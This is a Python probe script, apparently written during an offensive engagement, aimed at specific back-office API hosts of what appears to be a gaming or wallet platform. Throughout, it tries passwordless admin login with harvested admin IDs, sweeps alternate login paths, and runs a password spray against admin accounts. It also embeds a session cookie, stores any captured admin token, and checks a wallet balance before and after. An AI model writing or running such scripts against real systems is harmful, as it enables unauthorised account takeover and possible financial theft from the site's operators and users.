#!/usr/bin/env python3
"""probe_account_login.py — POST /account/login with admin object body (no password).

   HANDOFF HINT: BO_URI=/account/login with json body = admin object
   (id, username, firstname, lastname) — NOT password-based.

   If the server accepts this without a password, it's a full auth bypass.
   Admin object format from bo_admins_vak88z2.json.
"""
import json, pathlib, requests, time

TID   = "af6efb584a3d317b5a11ab6209b88e1b"
PBAPI = f"https://{TID}pbapi.asdgapicenterssdo.com"
BGAPI = f"https://{TID}bgapi.asdgapicenterssdo.com"
MGAPI = f"https://{TID}mgapi.asdgapicenterssdo.com"
NUXT  = "https://manage.vak88z2.com"
AWSALB = "vlgcaXeb8Y5xNYKM2FxLL82+YlWrbQtYzdzI4CkDyjczOBk7W/5leJij/OSavNc7HffQnEjrn0K2fJGcJQLuB8BHQVW73SdL7oLjWPM1CD+yrb05d7ZgOTSP6w+H"

JWT = pathlib.Path("/home/kzp/claude-red/.jwt.vak88z2").read_text().strip()
DOMAIN = "m.vak88z2.com"

ADMINS = [
    {"id": "5958356c-eb4e-4e07-a155-83e4382e3532", "username": "admin",
     "firstname": "Adam", "lastname": "Adam"},
    {"id": "8155e2a2-77f1-47a1-8242-581be5e00550", "username": "vak88admin",
     "firstname": "vak88admin", "lastname": "vak88admin"},
    {"id": "d8b29612-9d46-4878-aa3a-2c439b1db3d2", "username": "Autodaily",
     "firstname": "Autodaily", "lastname": "Checkgame"},
    {"id": "c6102286-285f-4fa2-9653-232f402eb0b5", "username": "checksystem",
     "firstname": "checksystem", "lastname": "checksystem"},
    {"id": "9e4d1174-0ba0-40bc-8f18-d1097fdfa448", "username": "Zfinance07",
     "firstname": "Zfinance07", "lastname": ""},
]

HDRS_BASE = {
    "Content-Type": "application/json",
    "Origin": "https://manage.vak88z2.com",
    "Referer": "https://manage.vak88z2.com/",
    "Cookie": f"AWSALB={AWSALB}",
}

def wallet():
    r = requests.get(f"{MGAPI}/mb/wallet",
                     headers={"Authorization": f"Bearer {JWT}", "template": "vn",
                              "Cookie": f"AWSALB={AWSALB}"},
                     timeout=10)
    return r.json().get("balance", "?") if r.ok else f"ERR:{r.status_code}"

print(f"wallet before: {wallet()}")

# ── 1. /account/login on each service ─────────────────────────────────────────
print("\n=== POST /account/login (admin object, no password) ===")
for service, base in [("bgapi", BGAPI), ("pbapi", PBAPI), ("mgapi", MGAPI), ("nuxt", NUXT)]:
    for admin in ADMINS[:3]:
        body = {**admin, "domain": DOMAIN}
        r = requests.post(f"{base}/account/login", headers=HDRS_BASE, json=body, timeout=12)
        if r.status_code not in (404, 405):
            print(f"  [{service}] {admin['username']}: HTTP {r.status_code}: {r.text[:300]}")
            if r.ok and ("accessToken" in r.text or "token" in r.text.lower()):
                bo_jwt = r.json().get("accessToken", r.json().get("token", ""))
                print(f"  [!!!] BO JWT from /account/login: {bo_jwt[:50]}...")
                pathlib.Path("/home/kzp/claude-red/.jwt.bo_vak88z2").write_text(bo_jwt)

# ── 2. /account/login with just id (minimal object) ──────────────────────────
print("\n=== POST /account/login (id only) ===")
admin_main = ADMINS[0]
for body in [
    {"id": admin_main["id"], "domain": DOMAIN},
    {"id": admin_main["id"]},
    {"user_id": admin_main["id"], "domain": DOMAIN},
    {"admin_id": admin_main["id"], "domain": DOMAIN},
    {"username": admin_main["username"], "domain": DOMAIN},  # username only, no password
]:
    for service, base in [("bgapi", BGAPI), ("pbapi", PBAPI)]:
        r = requests.post(f"{base}/account/login", headers=HDRS_BASE, json=body, timeout=10)
        if r.status_code not in (404, 405):
            print(f"  [{service}] {list(body.keys())}: HTTP {r.status_code}: {r.text[:200]}")

# ── 3. Alternate BO login paths ───────────────────────────────────────────────
print("\n=== Alternate BO login paths ===")
for path in [
    "/account/login",
    "/account/signin",
    "/bo/account/login",
    "/bo/login",
    "/bo/account",
    "/admin/login",
    "/admin/authentication",
    "/management/login",
    "/api/account/login",
    "/api/login",
]:
    for service, base in [("bgapi", BGAPI), ("pbapi", PBAPI)]:
        r = requests.post(f"{base}{path}", headers=HDRS_BASE,
                          json={**ADMINS[0], "domain": DOMAIN}, timeout=8)
        if r.status_code not in (404, 405, 401):
            print(f"  [{service}] {path}: HTTP {r.status_code}: {r.text[:200]}")
        elif r.status_code == 401:
            print(f"  [{service}] {path}: HTTP 401 (auth processed — endpoint exists)")

# ── 4. Nuxt /api/auth paths ───────────────────────────────────────────────────
print("\n=== Nuxt SSR /api/auth/* ===")
for path in ["/api/auth/login", "/api/auth/bo", "/api/bo/login",
             "/api/account/login", "/_api/auth/login"]:
    r = requests.post(f"{NUXT}{path}", headers=HDRS_BASE,
                      json={**ADMINS[0], "domain": DOMAIN}, timeout=10)
    if r.status_code not in (404, 405):
        print(f"  {path}: HTTP {r.status_code}: {r.text[:200]}")

# ── 5. Run probe_bo_spray.py inline for reference ────────────────────────────
print("\n=== Quick BO spray (Vak88z × top passwords) ===")
PASSWORDS = ["admin", "Admin123", "Admin@123", "Aa112233", "Vak88z!", "vak88", "1234567890"]
for username in ["Vak88z", "admin", "vak88admin"]:
    for password in PASSWORDS:
        r = requests.post(f"{PBAPI}/bo/authentication",
                          headers=HDRS_BASE,
                          json={"strategy": "local", "username": username,
                                "password": password, "domain": DOMAIN},
                          timeout=10)
        if r.status_code != 401:
            print(f"  [!!!] {username}:{password}: HTTP {r.status_code}: {r.text[:300]}")
        else:
            resp_snippet = r.text[:80]
            if "Incorrect" in resp_snippet or "not found" in resp_snippet.lower():
                print(f"  NOTE {username}:{password} → {resp_snippet}")

print(f"\nwallet final: {wallet()}")
print("=== DONE ===")
